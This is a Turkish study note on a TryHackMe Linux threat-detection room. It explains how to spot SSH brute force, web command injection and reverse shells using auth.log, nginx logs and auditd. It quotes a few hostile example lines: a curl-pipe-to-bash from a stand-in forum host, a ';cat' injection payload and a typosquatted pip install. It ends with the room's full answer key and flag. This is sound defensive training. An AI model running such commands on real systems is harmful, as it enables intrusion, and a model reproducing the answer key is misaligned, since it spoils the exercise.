# 🛡️ Linux Threat Detection 1 — Dökümantasyon

**Etiketler:** `#SOC` `#Linux` `#ThreatDetection` `#InitialAccess` `#SSHBruteForce` `#CommandInjection` `#ProcessTree` `#Auditd` `#MITRE` `#TryHackMe`

## 1. Mimari Yapı ve Linux Başlangıç Erişimi (Initial Access) Analitiği

Linux sunucularında sızma girişimlerinin çok büyük bir bölümü karmaşık sıfır-gün (zero-day) açıklarından ziyade **Dışa Açık Uzak Servisler (External Remote Services - MITRE T1133)** ve **Kamuya Açık Uygulamaların İstismarı (Exploit Public-Facing Application - MITRE T1190)** üzerinden gerçekleşir.

  

Bir SOC analisti için saldırıyı tespit etmenin en kritik yolu, saldırganın giriş yaptığı temas noktasını (Entry Point) çekirdek düzeyindeki süreç oluşturma zinciriyle (**Process Tree**) bağlamaktır.

  

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                          SALDIRGANIN GİRİŞ VEKTÖRLERİ                            │
├───────────────────────────────────────┬─────────────────────────────────────────┤
│    Vektör 1: Dışa Açık SSH (T1133)    │  Vektör 2: Güvensiz Web Servisi (T1190) │
│  - Çalınmış SSH Anahtarları           │  - Komut Enjeksiyonu (Command Injection)│
│  - Parola Kaba Kuvvet (Brute-Force)   │  - Hedef: /opt/trypingme/main.py        │
└───────────────────┬───────────────────┴────────────────────┬────────────────────┘
                    │                                        │
                    ▼                                        ▼
          /var/log/auth.log                        /var/log/nginx/access.log
    (Accepted/Failed password/key)                (HTTP 200/500, şüpheli payloadlar)
                    │                                        │
                    └───────────────────┬────────────────────┘
                                        ▼
                    ┌───────────────────────────────────────┐
                    │     DENETİM VE SÜREÇ AĞACI ANALİZİ    │
                    │         auditd (ausearch -i)          │
                    └───────────────────┬───────────────────┘
                                        │
             PID: 1 (systemd) ──► PID: 577 (Python Web App)
                                        │
                                        ▼
                                  PID: 1018 (/bin/sh -c)
                                        │
                                        ▼
                                  PID: 3907 (/usr/bin/whoami)
```

## 2. Tehdit Vektörleri ve Tespit Metodolojileri

### A. Dışa Açık SSH Servisi ve Kimlik Doğrulama Riskleri (MITRE T1133)

Shodan verilerine göre internete doğrudan açık 40 milyondan fazla SSH sunucusu bulunmaktadır. Tehdit aktörleri (örneğin _Outlaw_ grubu) kurdukları botnet ağlarıyla interneti sürekli tarar.

  

> [!INFO]
> 
> **SSH Anahtar ve Parola Tabanlı Giriş Riskleri:**
> 
>   
> 
> - **Anahtar Riskleri (Key-based):** Özel anahtarların (Private Key) GitHub depolarına veya Ansible otomasyon sunucularına açık metin sızdırılması; yönetici bilgisayarına bulaşan bilgi hırsızı (Infostealer) zararlıları.
>     
>       
>     
> - **Parola Riskleri (Password-based):** Geçici testler için açılıp unutulan zayıf parolalar, üçüncü taraf yüklenicilere verilen basit şifreler (`12345678`), eski sunucuların güvenlik duvarı arkasından çıkarılması.
>     
>       
>     

#### 🚨 Başarılı SSH Saldırısının 3 Temel Göstergesi (Indicators of Breach):

1. **Ardışık Başarısız Girişlerin Ardından Gelen Başarı:** Kısa sürede yüzlerce `Failed password` kaydını takip eden tek bir `Accepted password`.
    
      
    
2. **Güvenilmeyen Dış IP Adresleri:** Coğrafi olarak olağandışı veya Tehdit İstihbaratı (TI) skorlarında kötü niyetli görünen IP blokları.
    
      
    
3. **Parola ile Giriş Yapılması:** Kurumsal ortamlarda anahtar tabanlı kimlik doğrulama standarttır; parola ile giriş başlı başına bir anomali kabul edilmelidir.
    
      
    

### B. Kamuya Açık Web Uygulamaları ve Komut Enjeksiyonu (MITRE T1190)

Geliştiricilerin sistem komutlarını filtrelemeden doğrudan çağırması (`ping -c 2 [GİRDİ]`), saldırganlara **İşletim Sistemi Komut Enjeksiyonu (OS Command Injection)** alanı açar.

  

> [!WARNING]
> 
> **Web Erişim Loglarında Enjeksiyon İzleri:**
> 
>   
> 
> Nginx loglarında (`/var/log/nginx/access.log`) IP adresi parametresi beklenen yerlerde `;`, `&&`, `|` gibi komut ayırıcıları veya `whoami`, `ls`, `cat` komutlarının görülmesi sistemin istismar edildiğini gösterir. HTTP 500 hatalarının ardından dönen HTTP 200 yanıtı, saldırganın doğru sözdizimini (syntax) yakaladığının göstergesidir.
> 
>   

### C. Süreç Ağacı Analizi (Process Tree Analysis) — Evrensel Tespit Metodolojisi

Uygulama logları her zaman ayrıntı vermez. Şüpheli bir komut (`whoami`, `curl`, `nc`) görüldüğünde, bu komutun kim tarafından ve hangi ana uygulama üzerinden tetiklendiğini anlamak için geriye doğru süreç ağacı takip edilir.

  

> [!TIP]
> 
> **Süreç Hiyerarşisi İpuçları (PID vs PPID):**
> 
>   
> 
> - **PID (Process ID):** Sürecin kendi benzersiz kimliği.
>     
>       
>     
> - **PPID (Parent Process ID):** O süreci başlatan üst sürecin kimliği.
>     
>       
>     
> - Şüpheli bir komutun `ppid` değerini alıp `ausearch -i --pid [PPID]` ile sorgulayarak adım adım `PID 1`'e (veya ana sunucu yazılımına) kadar çıkılır. Bir web sunucusu (`python`, `nginx`, `apache`) altından `/bin/sh` veya ters kabuk (reverse shell) doğuyorsa sistem kesinlikle ele geçirilmiştir.
>     
>       
>     

### D. İnsan Odaklı Saldırılar ve Tedarik Zinciri Saldırıları (Supply Chain Compromise)

- **Sosyal Mühendislik / Forum Betikleri:** Yöneticilerin sorun çözerken internetten buldukları güvensiz komutları doğrudan çalıştırması (`curl https://shadyforum.thm/fix.sh | bash`).
    
      
    
- **Typosquatting (Yazım Hatası İstismarı):** Geliştiricilerin paket kurarken harf hatası yapması sonucu sahte kütüphanelerin sisteme yüklenmesi (`pip3 install fastpi`).
    
      
    
- **Tedarik Zinciri İstismarı (Supply Chain):** Güvenilir bir uygulamanın kaynak kodunun veya bağımlılıklarının ele geçirilerek güncelleme kanalıyla arka kapı yerleştirilmesi (Örn: `XZ Utils` arka kapısı veya `tj-actions` sızıntısı). Güvenilir bir yazılımın aniden beklenmedik komutlar yürütmesi bu saldırı tipine işaret eder.
    
      
    

## 3. Kullanılan Araçlar ve Tehdit İstihbaratı Referansları

|**Araç / Konsept**|**Açıklama ve SOC Analizindeki Yeri**|**Dokümantasyon / Kaynak**|
|---|---|---|
|**MITRE ATT&CK T1133**|Dışa Açık Uzak Servisler (External Remote Services - SSH, RDP).|[MITRE ATT&CK T1133](https://attack.mitre.org/techniques/T1133/?utm_source=gemini)|
|**MITRE ATT&CK T1190**|Kamuya Açık Uygulamaların İstismarı (Exploit Public-Facing Application).|[MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/?utm_source=gemini)|
|**MITRE ATT&CK T1195**|Tedarik Zinciri Uzlaşması (Supply Chain Compromise).|[MITRE ATT&CK T1195](https://attack.mitre.org/techniques/T1195/?utm_source=gemini)|
|**Shodan**|İnternete açık port ve servis tarama arama motoru.|[Shodan](https://www.shodan.io/?utm_source=gemini)|
|**Auditd / ausearch**|Linux çekirdek denetim mekanizması ve log sorgulama aracı.|[Auditd Man Page](https://man7.org/linux/man-pages/man8/auditd.8.html?utm_source=gemini)|
|**Outlaw Botnet**|SSH kaba kuvvet saldırılarıyla yayılan bilinen tehdit grubu.|[Outlaw Group Analysis](https://attack.mitre.org/groups/G0127/?utm_source=gemini)|

## 4. Tüm Terminal Komutları ve Parametre Referansı

### A. SSH Kimlik Doğrulama Analiz Komutları

Bash

```
# Tüm SSH oturum kayıtlarını auth.log içinden filtreleme
cat /var/log/auth.log | grep "sshd"

# Yalnızca başarılı (Accepted) SSH girişlerini listeleme
cat /var/log/auth.log | grep -E 'Accepted'

# Başarısız (Failed) SSH oturum denemelerini listeleme (Brute-force tespiti)
cat /var/log/auth.log | grep "sshd" | grep "Failed"

# İlk başarılı girişin detaylarını tarih formatında inceleme
cat /var/log/auth.log | grep "sshd.*Accepted" | head -n 1
```

### B. Web Erişim Logları Analiz Komutları

Bash

```
# Nginx web sunucusunun erişim loglarını görüntüleme
cat /var/log/nginx/access.log

# Komut enjeksiyonu denemelerini (ping parametresi üzerindeki şüpheli karakterleri) listeleme
cat /var/log/nginx/access.log | grep "GET /ping"

# Saldırganın web üzerinden okuduğu kaynak kod dosyasını görüntüleme
cat /opt/trypingme/main.py
```

### C. Auditd Süreç Ağacı Rekonstrüksiyon Komutları

Bash

```
# Belirli bir çalıştırılabilir komutu ismine göre filtreleme (-x)
# -i: Çıktıyı insan tarafından okunabilir (tarih ve kullanıcı adı) formata dönüştürür
# -x: Komut adına göre filtre uygular
ausearch -i -x whoami

# Belirli bir Süreç ID'sine (PID) sahip olayın tüm ayrıntılarını getirme
ausearch -i --pid 1018

# Üst süreci (TryPingMe uygulaması) bulmak için bir önceki olayın PPID'sini sorgulama
ausearch -i --pid 577

# Belirli bir üst sürecin (PPID) altında açılmış tüm alt çocuk süreçleri listeleme
# Ters kabuk (reverse shell) veya enjeksiyon komutlarını açığa çıkarır
ausearch -i --ppid 577 | grep 'proctitle'
```

## 5. Pratik Laboratuvar ve Görev Soru-Cevap Anahtarı

|**Görev #**|**Soru**|**Doğru Cevap**|**Analiz Yöntemi & İlgili Komut**|
|---|---|---|---|
|**T2.Q1**|When did the ubuntu user log in via SSH for the first time?|`2024-10-22`|`cat /var/log/auth.log \| grep "sshd.*Accepted.*ubuntu"` komutuyla ilk giriş kaydının tarihi belirlenir.|
|**T2.Q2**|Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)|`Yea`|İlgili satırda `Accepted publickey for ubuntu` ifadesi ve SHA256 anahtar özeti yer alır.|
|**T3.Q1**|When did the SSH password brute force start?|`2025-08-21`|`cat /var/log/auth.log \| grep "sshd.*Failed password"` çıktısındaki yoğun saldırı başlangıç tarihidir.|
|**T3.Q2**|Which four users did the botnet attempt to breach? (Alphabetical)|`root, roy, sol, user`|`Failed password for [kullanıcı]` satırları incelenerek alfabetik sıraya dizilir.|
|**T3.Q3**|Finally, which IP managed to breach the root user?|`91.224.92.79`|`cat /var/log/auth.log \| grep "Accepted password for root"` sorgusuyla saldırgan IP adresi yakalanır.|
|**T4.Q1**|What is the path to the Python file the attacker attempted to open?|`/opt/trypingme/main.py`|`/var/log/nginx/access.log` içindeki `;cat /opt/trypingme/main.py` enjeksiyon parametresinden çıkarılır.|
|**T4.Q2**|Looking inside the opened file, what's the flag you see there?|`THM{i_am_vulnerable!}`|`cat /opt/trypingme/main.py` çalıştırılarak dosya içeriğindeki bayrak okunur.|
|**T5.Q1**|What is the PPID of the suspicious whoami command?|`1018`|`ausearch -i -x whoami` komutuyla `SYSCALL` satırındaki `ppid` alanı okunur.|
|**T5.Q2**|Moving up the tree, what is the PID of the TryPingMe app?|`577`|`ausearch -i --pid 1018` komutuyla bir üst katmana çıkılarak uygulamanın ana PID'si bulunur.|
|**T5.Q3**|Which program did the attacker use to open a reverse shell?|`Python`|`ausearch -i --ppid 577` sorgusuyla uygulamanın başlattığı ters bağlantı komutu (`python -c ...`) tespit edilir.|
|**T6.Q1**|Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?|`Supply Chain Compromise`|Güvenilir bir yazılımın aniden zararlı davranış sergilemesi tedarik zinciri müdahalesidir.|
|**T6.Q2**|Which detection method can you use to detect a variety of Initial Access techniques?|`Process Tree Analysis`|Başlangıç erişim noktasını ve kök nedeni doğrulamak için kullanılan evrensel süreç ağacı yöntemidir.|

## 6. Tekrar Kategorisi ve Pazar Stratejisi

- **Kategori Sınıfı:** 🟡 **Sarı (Kavramsal Analiz & Triage Metodolojisi / 3 Dakika)**
    
      
    
- **Gerekçe:** SSH saldırı göstergeleri, Nginx erişim loglarındaki enjeksiyon modelleri ve `ausearch` ile süreç ağacı tırmanma adımları (`--pid` $\rightarrow$ `ppid`) mülakatlarda canlı vaka senaryosu olarak sorulur.
    
      
    
- **Pazar Günü 3 Dakikalık Tekrar Stratejisi:**
    
      
    1. **1. Dakika:** SSH ihlalini kanıtlayan 3 altın kuralı sesli tekrar et: _Çoklu başarısız giriş ardından başarı_, _harici şüpheli IP_, _parola kullanımı_.
        
          
        
    2. **2. Dakika:** Süreç ağacı tırmanma mantığını canlandır: Şüpheli komutun `ppid` değerini alıp `ausearch -i --pid [PPID]` ile ana web uygulamasına (PID 577) ulaşma süreci.
        
          
        
    3. **3. Dakika:** MITRE teknik kodlarını eşleştir: `T1133` (External Remote Services - SSH) ve `T1190` (Exploit Public-Facing Application - Web Command Injection).